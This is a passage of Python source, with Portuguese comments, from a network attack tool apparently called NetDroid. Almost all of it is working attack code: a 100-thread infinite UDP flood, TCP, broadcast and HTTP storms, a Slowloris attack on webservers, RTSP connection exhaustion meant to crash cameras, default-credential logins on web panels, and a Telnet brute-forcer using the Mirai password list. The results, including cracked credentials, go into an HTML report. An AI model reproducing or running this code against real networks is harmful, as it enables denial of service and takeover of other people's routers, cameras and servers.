    def __init__(self, ui: TerminalUI, detector: NetworkDetector, insane: bool = False):
        self.ui = ui
        self.det = detector
        self.insane = insane
        self.results: Dict[str, Any] = {}

    async def run_overfull(self):
        self.ui.section("STRESS TEST — OVERFULL")
        if not self.ui.consent("Stress pesado pode derrubar a rede. Continuar?"):
            self.ui.warn("Stress cancelado pelo usuário.")
            return
        gw = self.det.gateway
        if not gw:
            self.ui.error("Gateway não detectado. Impossível executar stress.")
            return

        monitor = LatencyMonitor(gw, self.ui)
        monitor.start()
        self.ui.info("Monitor de latência iniciado em background")

        try:
            await self._tcp_flood(gw)
            await self._udp_storm(gw)
            await self._http_storm(gw)
        except KeyboardInterrupt:
            self.ui.warn("Stress interrompido pelo usuário")
        finally:
            lat_stats = monitor.stop()
            self.results["latency"] = lat_stats
            self._print_latency_report(lat_stats)

    async def run_flood(self):
        self.ui.section(f"FLOOD ATTACK — INFINITE packets")
            
        gw = self.det.gateway
        if not gw:
            gw = self.det.target if self.det.target and self.det.target != "auto" else None
        
        if not gw:
            self.ui.error("Gateway ou alvo não detectado. Impossível executar flood.")
            return
            
        if gw.endswith(".0") or "/" in gw:
            try:
                net = ipaddress.ip_network(gw, strict=False)
                gw = str(next(net.hosts()))
            except Exception:
                pass

        self.ui.info(f"Iniciando envio massivo INFINITO (Multi-Thread) de pacotes UDP para {gw}...")
        self.ui.warn("Pressione Ctrl+C para interromper.")
        
        # Variáveis globais para contagem
        packet_count = [0]
        
        def udp_worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = os.urandom(65507)  # Payload máximo permitido
                local_count = 0
                while True:
                    try:
                        sock.sendto(payload, (gw, 80))
                        sock.sendto(payload, (gw, 53))
                        sock.sendto(payload, (gw, 443))
                        sock.sendto(payload, (gw, random.randint(1, 65535)))
                        local_count += 4
                        
                        # Atualiza o contador global a cada 1000 pacotes para não travar
                        if local_count >= 1000:
                            packet_count[0] += local_count
                            local_count = 0
                    except Exception:
                        pass
            except Exception:
                pass

        start = time.time()
        
        threads = []
        # Inicia 100 threads de flood pesadas
        for _ in range(100):
            t = threading.Thread(target=udp_worker, daemon=True)
            threads.append(t)
            t.start()
            
        try:
            while True:
                await asyncio.sleep(1)
                # printa em tempo real no mesmo lugar da tela
                print(f"\r  ⚡ [FLOOD] Pacotes enviados: {packet_count[0]:,} ...", end="")
        except KeyboardInterrupt:
            print() # pula a linha pra nao cortar o print anterior
            self.ui.warn("Interrompido pelo usuário.")
        except asyncio.CancelledError:
            print()
            self.ui.warn("Tarefa cancelada.")
            
        elapsed = time.time() - start
        
        self.ui.success(f"Flood interrompido. Tempo de ataque: {elapsed:.2f}s | Total de Pacotes: {packet_count[0]:,}")

    async def _tcp_flood(self, target: str):
        self.ui.info("TCP Connection Flood iniciando...")
        levels = [100, 250, 500, 1000] if not self.insane else [200, 500, 1000, 2000, 5000]
        port = 80

        for count in levels:
            self.ui.info(f"  Nível: {count} conexões simultâneas...")
            conns = []
            start = time.time()
            try:
                for _ in range(count):
                    try:
                        r, w = await asyncio.wait_for(
                            asyncio.open_connection(target, port), timeout=2)
                        conns.append(w)
                    except Exception:
                        break
                elapsed = time.time() - start
                self.ui.success(f"  {len(conns)}/{count} conexões em {elapsed:.2f}s")
                await asyncio.sleep(2)
            finally:
                for w in conns:
                    try:
                        w.close()
                    except Exception:
                        pass

    async def _udp_storm(self, target: str):
        self.ui.info("UDP Storm iniciando...")
        subnet = self.det.subnet
        broadcast = str(ipaddress.ip_network(subnet, strict=False).broadcast_address) if subnet else target
        payload = os.urandom(65507)
        duration = min(30, STRESS_MAX_DURATION) if not self.insane else min(60, STRESS_MAX_DURATION)
        sent = 0
        start = time.time()

        def storm():
            nonlocal sent
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            while time.time() - start < duration:
                try:
                    for port in [9, 7, 1900, 5353, 137]:
                        sock.sendto(payload, (broadcast, port))
                        sent += 1
                except Exception:
                    break
            sock.close()

        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, storm)
        self.ui.success(f"UDP Storm: {sent} pacotes enviados em {time.time() - start:.1f}s")

    async def _http_storm(self, target: str):
        if not HAS_AIOHTTP:
            self.ui.warn("aiohttp não disponível — HTTP storm ignorado")
            return
        self.ui.info("HTTP Storm iniciando...")
        url = f"http://{target}/"
        levels = [50, 100, 200] if not self.insane else [100, 300, 500, 1000]
        for count in levels:
            success = 0
            errors = 0
            start = time.time()
            connector = aiohttp.TCPConnector(limit=count, force_close=True)
            try:
                async with aiohttp.ClientSession(connector=connector) as session:
                    tasks = []
                    for _ in range(count):
                        tasks.append(self._http_req(session, url))
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for r in results:
                        if isinstance(r, Exception):
                            errors += 1
                        else:
                            success += 1
            except Exception:
                errors = count
            elapsed = time.time() - start
            self.ui.info(f"  {count} reqs: {success} OK / {errors} fail em {elapsed:.2f}s")
            await asyncio.sleep(1)

    async def _http_req(self, session, url: str):
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            await resp.read()
            return resp.status

    async def run_overflow(self):
        self.ui.section("STRESS TEST — OVERFLOW (iperf3)")
        if not shutil.which("iperf3"):
            self.ui.error("iperf3 não encontrado. Instale: pkg install iperf3")
            return
        gw = self.det.gateway
        if not gw:
            self.ui.error("Gateway não detectado.")
            return

        monitor = LatencyMonitor(gw, self.ui)
        monitor.start()
        try:
            self.ui.info("iperf3 TCP test...")
            await self._run_iperf(gw, False)
            self.ui.info("iperf3 UDP test...")
            await self._run_iperf(gw, True)
        finally:
            lat_stats = monitor.stop()
            self.results["latency"] = lat_stats
            self._print_latency_report(lat_stats)

    async def _run_iperf(self, target: str, udp: bool):
        cmd = ["iperf3", "-c", target, "-t", "10", "-J"]
        if udp:
            cmd.extend(["-u", "-b", "100M"])
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
            out = stdout.decode(errors="ignore")
            try:
                data = json.loads(out)
                end = data.get("end", {})
                if udp:
                    stream = end.get("sum", {})
                    self.ui.success(f"  UDP: {stream.get('bits_per_second', 0) / 1e6:.1f} Mbps | "
                                    f"Jitter: {stream.get('jitter_ms', 0):.2f}ms | "
                                    f"Loss: {stream.get('lost_percent', 0):.1f}%")
                else:
                    sent = end.get("sum_sent", {})
                    recv = end.get("sum_received", {})
                    self.ui.success(f"  TCP TX: {sent.get('bits_per_second', 0) / 1e6:.1f} Mbps | "
                                    f"RX: {recv.get('bits_per_second', 0) / 1e6:.1f} Mbps")
                self.results[f"iperf_{'udp' if udp else 'tcp'}"] = end
            except json.JSONDecodeError:
                self.ui.warn(f"  iperf3 output não-JSON: {out[:100]}")
        except asyncio.TimeoutError:
            self.ui.error("  iperf3 timeout")
        except FileNotFoundError:
            self.ui.error("  iperf3 não disponível no servidor remoto")

    def _print_latency_report(self, stats: Dict):
        rows = [
            ["Baseline", f"{stats['baseline_ms']}ms"],
            ["Média", f"{stats['avg_ms']}ms"],
            ["Mínima", f"{stats['min_ms']}ms"],
            ["Máxima", f"{stats['max_ms']}ms"],
            ["Packet Loss", f"{stats['packet_loss_pct']}%"],
            ["Amostras", str(stats['samples'])],
        ]
        self.ui.table("Latência durante Stress",
                       [("Métrica", C_CYAN), ("Valor", C_GREEN)], rows)


# ═══════════════════ GOD MODE ═════════════════════════════════

class GodMode:
    """Broadcast + NetBIOS + HTTP deep probe + credential audit + RTSP."""

    def __init__(self, ui: TerminalUI, detector: NetworkDetector,
                 hosts: List[Dict[str, Any]]):
        self.ui = ui
        self.det = detector
        self.hosts = hosts
        self.found_creds: List[Dict] = []
        self.ssdp_devices: List[Dict] = []
        self.rtsp_streams: List[Dict] = []
        self.onvif_devices: List[Dict] = []

    async def run(self):
        self.ui.section("GOD MODE — FULL NETWORK INTERACTION")
        if not self.ui.consent("O God Mode agora inclui ataques de stress (Slowloris/RTSP-Kill) e Brute-force. Continuar?"):
            self.ui.warn("God Mode cancelado.")
            return
        
        # Sequência completa "God"
        await self.run_onvif()
        await self._broadcast_sweep()
        await self._netbios_scan()
        await self._http_deep_probe()
        await self._rtsp_discovery()
        await self.run_mirai()
        
        # Ataques de Stress (Somente se no God Mode)
        await self.run_slowloris()
        await self.run_rtsp_kill()
        
        self._print_god_summary()

    async def _broadcast_sweep(self):
        self.ui.info("UDP Broadcast sweep...")
        subnet = self.det.subnet
        if not subnet:
            return
        broadcast = str(ipaddress.ip_network(subnet, strict=False).broadcast_address)
        payload = os.urandom(64)
        ports = [9, 7, 1900, 5353, 137]

        def send_broadcasts():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.settimeout(0.5)
            for port in ports:
                try:
                    sock.sendto(payload, (broadcast, port))
                except Exception:
                    pass
            sock.close()

        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, send_broadcasts)
        await self._ssdp_discover()
        self.ui.success(f"Broadcast: {len(self.ssdp_devices)} dispositivos SSDP")

    async def _ssdp_discover(self):
        msg = (
            "M-SEARCH * HTTP/1.1\r\n"
            "HOST: 239.255.255.250:1900\r\n"
            'MAN: "ssdp:discover"\r\n'
            "MX: 3\r\n"
            "ST: ssdp:all\r\n\r\n"
        )
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.settimeout(3)
            sock.sendto(msg.encode(), ("239.255.255.250", 1900))
            while True:
                try:
                    data, addr = sock.recvfrom(4096)
                    resp = data.decode(errors="ignore")
                    device = {"ip": addr[0], "port": addr[1]}
                    for line in resp.splitlines():
                        if ":" in line:
                            k, v = line.split(":", 1)
                            device[k.strip().lower()] = v.strip()
                    self.ssdp_devices.append(device)
                except socket.timeout:
                    break
            sock.close()
        except Exception:
            pass

    async def _netbios_scan(self):
        self.ui.info("NetBIOS scan...")
        query = (b"\x80\x94\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                 b"\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x21\x00\x01")
        found_hosts = []

        def query_host(ip: str):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                sock.sendto(query, (ip, 137))
                data, _ = sock.recvfrom(1024)
                sock.close()
                if len(data) > 56:
                    name_count = data[56]
                    names = []
                    offset = 57
                    for _ in range(min(name_count, 10)):
                        if offset + 18 <= len(data):
                            name = data[offset:offset + 15].decode(errors="ignore").strip()
                            if name:
                                names.append(name)
                            offset += 18
                    if names:
                        found_hosts.append({"ip": ip, "names": names})
                        return True
            except Exception:
                pass
            return False

        loop = asyncio.get_event_loop()
        with ThreadPoolExecutor(max_workers=50) as pool:
            targets = [h["ip"] for h in self.hosts]
            results = await asyncio.gather(*[
                loop.run_in_executor(pool, query_host, ip) for ip in targets])

        if found_hosts:
            self.ui.success(f"NetBIOS: {len(found_hosts)} hosts Windows encontrados")
            for h in found_hosts:
                self.ui.info(f"  {h['ip']}: {', '.join(h['names'][:3])}")
            self._send_netbios_message(found_hosts)

    def _send_netbios_message(self, hosts: List[Dict]):
        self.ui.info(f"Enviando mensagem NetBIOS: \"{NETBIOS_MESSAGE}\"")
        for h in hosts:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                msg_data = NETBIOS_MESSAGE.encode("utf-8")
                sock.sendto(msg_data, (h["ip"], 138))
                sock.close()
            except Exception:
                pass

    async def _http_deep_probe(self):
        if not HAS_AIOHTTP or not HAS_BS4:
            self.ui.warn("aiohttp/bs4 necessários para HTTP deep probe")
            return
        self.ui.info("HTTP Deep Probe em hosts com portas web...")
        web_hosts = []
        for h in self.hosts:
            web_ports = [p for p in h.get("ports", [])
                         if p in (80, 443, 8080, 8443, 8000, 8888, 8081, 81)]
            if web_ports:
                web_hosts.append((h, web_ports))
        if not web_hosts:
            self.ui.warn("Nenhum host com porta web aberta.")
            return

        connector = aiohttp.TCPConnector(limit=20, ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for host, ports in web_hosts:
                for port in ports:
                    await self._probe_web(session, host, port)
                    await self._probe_api_endpoints(session, host, port)
                    await self._audit_default_creds(session, host, port)

    async def _probe_web(self, session, host: Dict, port: int):
        ip = host["ip"]
        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{ip}:{port}/"
        try:
            async with session.get(url, ssl=False) as resp:
                text = await resp.text(errors="ignore")
                soup = BeautifulSoup(text, "html.parser")
                title = soup.title.string.strip() if soup.title and soup.title.string else "N/A"
                server = resp.headers.get("Server", "N/A")
                vendor = self._fingerprint_device(title, text, server)
                has_login = bool(soup.find("input", {"type": "password"}))
                host.setdefault("web_info", []).append({
                    "port": port, "title": title, "server": server,
                    "vendor": vendor, "has_login": has_login,
                    "status": resp.status,
                })
                label = f"[LOGIN]" if has_login else ""
                self.ui.info(f"  {ip}:{port} — {title} | {server} | {vendor} {label}")
        except Exception:
            pass

    def _fingerprint_device(self, title: str, body: str, server: str) -> str:
        combined = f"{title} {body[:2000]} {server}".lower()
        signatures = {
            "tp-link": "TP-Link", "tplink": "TP-Link", "dahua": "Dahua",
            "hikvision": "Hikvision", "hikdigital": "Hikvision",
            "asus": "ASUS", "mikrotik": "MikroTik", "routeros": "MikroTik",
            "d-link": "D-Link", "dlink": "D-Link", "netgear": "Netgear",
            "ubiquiti": "Ubiquiti", "unifi": "Ubiquiti",
            "linksys": "Linksys", "cisco": "Cisco",
            "huawei": "Huawei", "intelbras": "Intelbras",
            "fortinet": "Fortinet", "fortigate": "Fortinet",
        }
        for key, vendor in signatures.items():
            if key in combined:
                return vendor
        return "Unknown"

    async def _probe_api_endpoints(self, session, host: Dict, port: int):
        ip = host["ip"]
        scheme = "https" if port in (443, 8443) else "http"
        for ep in API_ENDPOINTS:
            url = f"{scheme}://{ip}:{port}{ep}"
            try:
                async with session.get(url, ssl=False) as resp:
                    if resp.status < 400:
                        host.setdefault("api_endpoints", []).append(
                            {"path": ep, "status": resp.status, "port": port})
                        self.ui.success(f"  API: {ip}:{port}{ep} → {resp.status}")
            except Exception:
                pass

    async def _audit_default_creds(self, session, host: Dict, port: int):
        web_info = host.get("web_info", [])
        port_info = next((w for w in web_info if w["port"] == port), None)
        if not port_info or not port_info.get("has_login"):
            return
        vendor = port_info.get("vendor", "Unknown").lower()
        creds = DEFAULT_CREDS.get(vendor, []) + DEFAULT_CREDS["generic"]
        ip = host["ip"]
        scheme = "https" if port in (443, 8443) else "http"

        for user, passwd in creds[:10]:
            try:
                auth = aiohttp.BasicAuth(user, passwd)
                url = f"{scheme}://{ip}:{port}/"
                async with session.get(url, auth=auth, ssl=False) as resp:
                    if resp.status in (200, 301, 302):
                        text = await resp.text(errors="ignore")
                        if "logout" in text.lower() or "dashboard" in text.lower() or resp.status == 200:
                            cred_info = {"ip": ip, "port": port, "user": user,
                                         "password": passwd, "vendor": vendor}
                            self.found_creds.append(cred_info)
                            self.ui.success(f"  [CRED] {ip}:{port} — {user}:{passwd}")
                            return
            except Exception:
                pass

    async def _rtsp_discovery(self):
        self.ui.info("RTSP Stream Discovery...")
        rtsp_hosts = [h for h in self.hosts if 554 in h.get("ports", [])]
        if not rtsp_hosts:
            self.ui.warn("Nenhum host com RTSP (554) aberto.")
            return
        for host in rtsp_hosts:
            ip = host["ip"]
            for path in RTSP_PATHS:
                if await self._test_rtsp(ip, path):
                    stream = {"ip": ip, "path": path, "url": f"rtsp://{ip}{path}"}
                    self.rtsp_streams.append(stream)
                    self.ui.success(f"  RTSP: rtsp://{ip}{path}")

    async def _test_rtsp(self, ip: str, path: str) -> bool:
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(ip, 554), timeout=3)
            req = f"DESCRIBE rtsp://{ip}{path} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
            w.write(req.encode())
            await w.drain()
            data = await asyncio.wait_for(r.read(512), timeout=3)
            w.close()
            await w.wait_closed()
            resp = data.decode(errors="ignore")
            return "200 OK" in resp
        except Exception:
            return False

    def _print_god_summary(self):
        if self.found_creds:
            rows = [[c["ip"], str(c["port"]), c["user"], c["password"], c["vendor"]]
                    for c in self.found_creds]
            self.ui.table("⚠ CREDENCIAIS ENCONTRADAS",
                           [("IP", C_RED), ("Port", C_RED), ("User", C_YELLOW),
                            ("Password", C_YELLOW), ("Vendor", C_WHITE)], rows)
        if self.rtsp_streams:
            rows = [[s["ip"], s["url"]] for s in self.rtsp_streams]
            self.ui.table("RTSP Streams",
                           [("IP", C_GREEN), ("URL", C_CYAN)], rows)
        if self.ssdp_devices:
            rows = [[d.get("ip", "?"), d.get("server", d.get("st", "?"))]
                    for d in self.ssdp_devices[:20]]
            self.ui.table("SSDP Devices",
                           [("IP", C_GREEN), ("Service", C_CYAN)], rows)
        if self.onvif_devices:
            rows = [[d.get("ip", "?"), d.get("model", "?"), d.get("firmware", "?")]
                    for d in self.onvif_devices[:20]]
            self.ui.table("ONVIF Cameras",
                           [("IP", C_GREEN), ("Model", C_CYAN), ("Firmware", C_YELLOW)], rows)

    async def run_onvif(self):
        self.ui.section("ONVIF WS-DISCOVERY")
        msg = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope" xmlns:dn="http://www.onvif.org/ver10/network/wsdl">'
            '<Header><wsa:MessageID xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">uuid:11111111-2222-3333-4444-555555555555</wsa:MessageID>'
            '<wsa:To xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To>'
            '<wsa:Action xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action></Header>'
            '<Body><Probe xmlns="http://schemas.xmlsoap.org/ws/2005/04/discovery" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
            '<Types>dn:NetworkVideoTransmitter</Types>'
            '<Scopes /></Probe></Body></Envelope>'
        )
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.settimeout(3)
            sock.sendto(msg.encode(), ("239.255.255.250", 3702))
            while True:
                try:
                    data, addr = sock.recvfrom(4096)
                    resp = data.decode(errors="ignore")
                    if "ProbeMatch" in resp:
                        m_model = re.search(r'hardware/([^/<\s]+)', resp)
                        m_firm = re.search(r'firmware/([^/<\s]+)', resp)
                        cam = {
                            "ip": addr[0],
                            "model": m_model.group(1) if m_model else "Unknown",
                            "firmware": m_firm.group(1) if m_firm else "Unknown"
                        }
                        if not any(d["ip"] == cam["ip"] for d in self.onvif_devices):
                            self.onvif_devices.append(cam)
                            self.ui.success(f"  [ONVIF] {cam['ip']} — {cam['model']} (FW: {cam['firmware']})")
                except socket.timeout:
                    break
            sock.close()
        except Exception as e:
            self.ui.error(f"Erro no ONVIF: {e}")

    async def run_slowloris(self):
        self.ui.section("SLOWLORIS IOT ATTACK")
        if not self.ui.consent("Ataque destrutivo (derruba webservers). Continuar?"):
            return
        web_hosts = [h for h in self.hosts if set(h.get("ports", [])).intersection({80, 8080})]
        if not web_hosts:
            self.ui.warn("Nenhum alvo web (porta 80/8080) encontrado.")
            return

        async def attack_loris(ip: str, port: int):
            self.ui.info(f"  -> Atacando {ip}:{port} (abrindo 200 conexões lentas)")
            sockets = []
            for _ in range(200):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((ip, port))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                    s.send(f"Host: {ip}\r\n".encode("utf-8"))
                    s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
                    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                    sockets.append(s)
                except Exception:
                    pass
            
            end_time = time.time() + 15  # 15 seconds attack
            while time.time() < end_time and sockets:
                for s in list(sockets):
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    except socket.error:
                        sockets.remove(s)
                await asyncio.sleep(2)
            
            for s in sockets:
                try: s.close()
                except: pass
            self.ui.success(f"  [LORIS] Ataque em {ip} concluído.")

        tasks = []
        for h in web_hosts:
            for p in [80, 8080]:
                if p in h.get("ports", []):
                    tasks.append(attack_loris(h["ip"], p))
        await asyncio.gather(*tasks)

    async def run_rtsp_kill(self):
        self.ui.section("RTSP CONNECTION EXHAUSTION")
        if not self.ui.consent("Ataque destrutivo (trava câmeras). Continuar?"):
            return
        rtsp_hosts = [h for h in self.hosts if 554 in h.get("ports", [])]
        if not rtsp_hosts:
            self.ui.warn("Nenhum host com porta 554 (RTSP) aberta.")
            return

        async def exhaust_rtsp(ip: str):
            self.ui.info(f"  -> Esgotando pool RTSP de {ip} (100 threads)")
            sockets = []
            for i in range(100):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((ip, 554))
                    # Manda SETUP malformado/incompleto e prende a thread da câmera
                    req = f"SETUP rtsp://{ip}/ RTSP/1.0\r\nCSeq: {i}\r\nTransport: RTP/AVP;unicast;client_port=8000-8001\r\n\r\n"
                    s.send(req.encode())
                    sockets.append(s)
                except Exception:
                    pass
            
            self.ui.info(f"  -> {len(sockets)} conexões RTSP mantidas. Segurando por 10s...")
            await asyncio.sleep(10)
            
            for s in sockets:
                try: s.close()
                except: pass
            self.ui.success(f"  [RTSP-KILL] Câmera {ip} possivelmente reiniciada.")

        await asyncio.gather(*[exhaust_rtsp(h["ip"]) for h in rtsp_hosts])

    async def run_mirai(self):
        self.ui.section("MIRAI BRUTE-FORCE (TELNET/SSH)")
        mirai_hosts = [h for h in self.hosts if 22 in h.get("ports", []) or 23 in h.get("ports", [])]
        if not mirai_hosts:
            self.ui.warn("Nenhum host com Telnet/SSH ativo.")
            return
            
        creds = [
            ("root", "xc3511"), ("root", "vizxv"), ("root", "admin"), 
            ("admin", "admin"), ("root", "888888"), ("root", "xmhdipc"), 
            ("root", "default"), ("root", "juantech"), ("root", "123456"), 
            ("root", "54321"), ("support", "support"), ("root", ""), 
            ("admin", "password"), ("root", "root"), ("admin", ""), 
            ("admin", "1111"), ("admin", "1234"), ("admin", "12345"),
            ("admin", "54321"), ("admin", "7777777"), ("admin", "12345678"),
            ("admin", "123456"), ("root", "12345678"), ("root", "pass"),
            ("guest", "guest"), ("user", "user"), ("admin", "pass")
        ]
        
        async def try_telnet(ip: str, user: str, pswd: str) -> bool:
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(ip, 23), timeout=2)
                
                # Aguarda prompt de login
                await asyncio.wait_for(r.read(1024), timeout=2)
                w.write(f"{user}\r\n".encode())
                await w.drain()
                
                # Aguarda prompt de senha
                await asyncio.wait_for(r.read(1024), timeout=2)
                w.write(f"{pswd}\r\n".encode())
                await w.drain()
                
                # Verifica resposta
                resp = await asyncio.wait_for(r.read(1024), timeout=2)
                w.close()
                await w.wait_closed()
                
                resp_text = resp.decode(errors="ignore").lower()
                return not any(bad in resp_text for bad in ["incorrect", "invalid", "failed", "login:"])
            except Exception:
                return False

        sem = asyncio.Semaphore(50)
        async def crack_host(h: Dict):
            ip = h["ip"]
            if 23 in h.get("ports", []):
                self.ui.info(f"  -> Brute-forcing Telnet (23) em {ip}...")
                for user, pswd in creds:
                    async with sem:
                        success = await try_telnet(ip, user, pswd)
                        if success:
                            self.found_creds.append({"ip": ip, "port": 23, "user": user, "password": pswd, "vendor": "Mirai-Telnet"})
                            self.ui.success(f"  [MIRAI] Telnet Cracked! {ip}:23 -> {user}:{pswd}")
                            return

        await asyncio.gather(*[crack_host(h) for h in mirai_hosts])


# ═══════════════════ REPORT ENGINE ════════════════════════════

class ReportEngine:
    """Generates cyberpunk HTML report and executive TXT summary."""

    def __init__(self, ui: TerminalUI, detector: NetworkDetector,
                 hosts: List[Dict], stress_results: Dict = None,
                 god_data: Dict = None):
        self.ui = ui
        self.det = detector
        self.hosts = hosts
        self.stress = stress_results or {}
        self.god = god_data or {}
        self.timestamp = datetime.now()

    def generate(self):
        self.ui.section("REPORT GENERATION")
        out_dir = self.det.output_dir or Path(".")
        html_path = out_dir / f"report_{self.timestamp.strftime('%Y-%m-%d_%Hh%M')}.html"
        txt_path = out_dir / f"{self.det.ssid or 'scan'}_{self.timestamp.strftime('%Y-%m-%d')}.txt"
        self._write_html(html_path)
        self._write_txt(txt_path)
        self.ui.success(f"HTML: {html_path}")
        self.ui.success(f"TXT:  {txt_path}")

    def _write_html(self, path: Path):
        hosts_rows = ""
        for h in self.hosts:
            ports_str = ", ".join(str(p) for p in h.get("ports", [])[:15])
            svcs = ", ".join(f"{p}:{s.get('service','?')}"
                            for p, s in list(h.get("services", {}).items())[:8])
            web = ""
            for w in h.get("web_info", []):
                web += f"{w.get('title','')} "
            hosts_rows += f"""<tr>
                <td>{html.escape(h['ip'])}</td><td>{html.escape(h.get('mac','N/A'))}</td>
                <td>{html.escape(h.get('vendor','?'))}</td><td>{html.escape(h.get('os','?'))}</td>
                <td>{html.escape(ports_str)}</td><td>{html.escape(svcs)}</td>
                <td>{html.escape(web.strip()[:50])}</td></tr>"""

        creds_section = ""
        creds = self.god.get("creds", [])
        if creds:
            creds_rows = "".join(
                f"<tr><td>{html.escape(c['ip'])}</td><td>{c['port']}</td>"
                f"<td>{html.escape(c['user'])}</td><td>{html.escape(c['password'])}</td>"
                f"<td>{html.escape(c.get('vendor',''))}</td></tr>" for c in creds)
            creds_section = f"""<div class="card cred-card">
                <h2>⚠ Credenciais Encontradas</h2>
                <table><tr><th>IP</th><th>Port</th><th>User</th><th>Password</th>
                <th>Vendor</th></tr>{creds_rows}</table></div>"""

        lat_section = ""
        lat = self.stress.get("latency", {})
        if lat:
            lat_section = f"""<div class="card"><h2>Latência durante Stress</h2>
                <table><tr><th>Baseline</th><th>Avg</th><th>Min</th><th>Max</th>
                <th>Loss</th></tr><tr><td>{lat.get('baseline_ms',0)}ms</td>
                <td>{lat.get('avg_ms',0)}ms</td><td>{lat.get('min_ms',0)}ms</td>
                <td>{lat.get('max_ms',0)}ms</td>
                <td>{lat.get('packet_loss_pct',0)}%</td></tr></table></div>"""

        topo_svg = self._generate_topology_svg()

        content = f"""<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>NetDroid Report — {html.escape(self.det.ssid or 'Scan')}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace;padding:20px}}
h1{{color:#cc0000;text-align:center;font-size:2em;margin:20px 0;text-shadow:0 0 10px #cc000066}}
h2{{color:#cc0000;margin:15px 0 10px;border-bottom:1px solid #cc000044;padding-bottom:5px}}
.card{{background:#111;border:1px solid #cc0000;border-radius:8px;padding:20px;margin:15px 0;
       box-shadow:0 0 15px #cc000022}}
.cred-card{{border-color:#ff0000;box-shadow:0 0 20px #ff000044}}
table{{width:100%;border-collapse:collapse;margin:10px 0}}
th{{background:#1a0000;color:#cc0000;padding:8px;text-align:left;border-bottom:2px solid #cc0000}}
td{{padding:6px 8px;border-bottom:1px solid #222}}
tr:hover{{background:#1a1a1a}}
.meta{{color:#555;text-align:center;margin:10px 0;font-size:0.85em}}
.stat{{display:inline-block;background:#1a0000;border:1px solid #cc000044;
       border-radius:4px;padding:8px 15px;margin:5px;text-align:center}}
.stat .val{{font-size:1.5em;color:#00ff41;font-weight:bold}}
.stat .lbl{{font-size:0.75em;color:#888}}
.topo{{text-align:center;margin:20px 0}}
</style></head><body>
<h1>⟨ NetDroid Report ⟩</h1>
<p class="meta">SSID: {html.escape(self.det.ssid or 'N/A')} |
Gateway: {html.escape(self.det.gateway or 'N/A')} |
Subnet: {html.escape(self.det.subnet or 'N/A')} |
{self.timestamp.strftime('%Y-%m-%d %H:%M')}</p>
<div style="text-align:center">
<div class="stat"><div class="val">{len(self.hosts)}</div><div class="lbl">Hosts</div></div>
<div class="stat"><div class="val">{sum(len(h.get('ports',[])) for h in self.hosts)}</div>
<div class="lbl">Open Ports</div></div>
<div class="stat"><div class="val">{len(creds)}</div><div class="lbl">Creds Found</div></div>
</div>
<div class="topo">{topo_svg}</div>
<div class="card"><h2>Hosts Descobertos</h2>
<table><tr><th>IP</th><th>MAC</th><th>Vendor</th><th>OS</th><th>Ports</th>
<th>Services</th><th>Web</th></tr>{hosts_rows}</table></div>
{creds_section}{lat_section}
<p class="meta">NetDroid v{VERSION} — Gerado automaticamente</p>
</body></html>"""
        path.write_text(content, encoding="utf-8")

    def _generate_topology_svg(self) -> str:
        n = len(self.hosts)
        if n == 0:
            return ""
        w, h = 600, 400
        cx, cy = w // 2, h // 2
        nodes = []
        for i, host in enumerate(self.hosts[:20]):
            angle = (2 * math.pi * i) / min(n, 20)
            r = 150
            x = cx + r * math.cos(angle)
            y = cy + r * math.sin(angle)
            color = "#00ff41" if not host.get("is_gateway") else "#cc0000"
            label = host["ip"].split(".")[-1]
            nodes.append(f'<line x1="{cx}" y1="{cy}" x2="{x:.0f}" y2="{y:.0f}" '
                         f'stroke="#333" stroke-width="1"/>')
